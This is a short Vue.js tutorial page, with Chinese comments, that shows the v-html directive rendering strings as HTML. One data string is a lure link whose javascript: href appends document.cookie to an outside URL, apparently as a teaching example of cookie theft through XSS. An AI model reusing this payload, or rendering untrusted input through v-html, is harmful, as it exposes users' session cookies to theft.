<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html_指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>你好，{{name}}</div>

        <!-- v-html支持html結構解析，所以可將字串內容讀取為html標籤 -->
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip=false
        
        new Vue({
            el:'#root',
            data:{
                name:'小白',
                str:'<h3>您好阿!</h3>',
                str2:'<a href=javascript:location.href="https://www.youtube.com?"+document.cookie>我找到你想要的資源了阿!</a>'
            }
        })
    </script>
</body>
</html>
